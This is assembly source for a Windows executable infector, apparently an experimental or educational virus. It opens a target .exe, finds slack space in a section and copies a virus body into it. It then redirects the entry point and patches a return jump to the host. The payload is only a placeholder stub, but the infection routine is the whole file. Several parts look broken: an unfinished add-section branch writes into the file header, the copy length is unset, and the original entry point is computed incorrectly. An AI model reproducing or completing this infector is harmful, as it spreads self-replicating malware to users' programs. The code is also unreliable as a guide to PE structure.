; #########################################################################

    .386
    .model flat, stdcall

; #########################################################################

    include \masm32\include\windows.inc
    include \masm32\include\user32.inc
    include \masm32\include\kernel32.inc

    includelib \masm32\lib\user32.lib
    includelib \masm32\lib\kernel32.lib

; #########################################################################

    .data

szInFile        DB      "donothing.exe", 0
szOutFile       DB      "donothing-infected.exe", 0

hInstance       DWORD   0
CommandLine     DWORD   0

hFile           DWORD   0
hFileMapping    DWORD   0

pDosHeader      DWORD   0
pNtHeaders      DWORD   0

pFileHeader     DWORD   0
pOptHeader      DWORD   0


; #########################################################################

    .code

start:

    call GetModuleHandle
    mov hInstance, eax
    
    call GetCommandLine
    mov CommandLine, eax

    push SW_SHOWDEFAULT
    push CommandLine
    push NULL
    push hInstance
    call WinMain

    push eax
    call ExitProcess
    
; #########################################################################

WinMain proc    hInst       :DWORD,
                hPrevInst   :DWORD,
                CmdLine     :DWORD,
                CmdShow     :DWORD

; TODO: CmdLine parsing
    push offset szInFile
    call Infect
      
    ret
    
WinMain endp

; #########################################################################

Infect proc     FileName    :DWORD

    push NULL
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push NULL
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push GENERIC_READ or GENERIC_WRITE
    push FileName
    call CreateFile

    cmp eax, INVALID_HANDLE_VALUE
    je err0
    
    mov hFile, eax

    push NULL
    push 0
    push 0
    push PAGE_READWRITE
    push NULL
    push hFile
    call CreateFileMapping

    cmp eax, NULL
    je err1
    
    mov hFileMapping, eax

    push 0
    push 0
    push 0
    push FILE_MAP_READ or FILE_MAP_WRITE
    push hFileMapping
    call MapViewOfFile

    cmp eax, NULL
    je err2

    mov pDosHeader, eax

    ; Check DOS Header
    cmp WORD PTR [eax], IMAGE_DOS_SIGNATURE
    jne err2

    add eax, [eax+3Ch]                          ; e_lfanew
    mov pNtHeaders, eax

    ; Check NT Header
    cmp DWORD PTR [eax], IMAGE_NT_SIGNATURE
    jne err2

    add eax, 04h
    mov pFileHeader, eax

    add eax, 14h
    mov pOptHeader, eax
    
    ; Check if we have enough space to add our
    ; section entry.
    mov eax, pFileHeader
    xor ecx, ecx
    mov cx, WORD PTR [eax+02h]
    
    mov eax, pNtHeaders
    add eax, IMAGE_NT_HEADERS
    
    mov ebx, IMAGE_SECTION_HEADER
    imul ebx, ecx

    add eax, ebx
    mov ecx, 0
    
checkPad:
    cmp DWORD PTR [eax+ecx], 0
    jne checkSection

    add ecx, 4
    cmp ecx, IMAGE_SECTION_HEADER
    
    jl checkPad

addSection:
    mov eax, pFileHeader
    inc WORD PTR [eax+02h]                      ; NumberOfSections

    mov DWORD PTR [eax], 'w0p.'
    mov DWORD PTR [eax + 04h], 'n'
    mov DWORD PTR [eax + 08h], __virus_e-__virus_b
    mov ebx, pOptHeader
    mov ebx, [ebx+20h]                          ; SectionAlignment
    add ebx, DWORD PTR [eax - 1Ch]              ; VirtualAddress (previous)
       
checkSection:
    ; Loop on all sections and search for someone
    ; which fit with virus size.
    mov eax, pFileHeader
    xor ecx, ecx
    mov cx, WORD PTR [eax+02h]                  ; NumberOfSections

    mov eax, pNtHeaders
    add eax, IMAGE_NT_HEADERS
    ;add eax, 0F8h

    ;mov ebx, __virus_e
    ;sub ebx, __virus_b

loopSection:
    mov edx, [eax+10h]                          ; SizeOfRawData
    sub edx, [eax+08h]                          ; VirtualSize

    cmp __virus_e-__virus_b, edx
    jg nextSection

    ; We found a section. Infect it!
    mov edi, pDosHeader
    add edi, [eax+10h]                          ; SizeOfRawData
    add edi, [eax+08h]                          ; VirtualSize

    mov ecx, ebx
    mov esi, __virus_b
    rep movsb
    
    mov ebx, pOptHeader
    
    ; Compute new EP
    mov ecx, [eax+0Ch]                          ; VirtualAddress
    add ecx, [eax+08h]                          ; VirtualSize

    ; Compute old EP abs addr
    mov edx, [eax+0Ch]                          ; VirtualAddress
    add edx, [ebx+1Ch]                          ; ImageBase
    
    ; Change EP
    mov [ebx+10h], ecx

    ; Patch Virus (push instruction)
    ; 5 is the size of the 42424242h + ret inst.
    sub edi, 5
    mov [edi], edx

    ; We're done
    jmp err2
    
nextSection:
    add eax, 28h
    loop loopSection
    
err2:
    push hFileMapping
    call CloseHandle    
    
err1:
    push hFile
    call CloseHandle

err0:
    ret
    
Infect endp

; #########################################################################

__virus_b:
    push 42424242h
    ret
__virus_e:

; #########################################################################

end start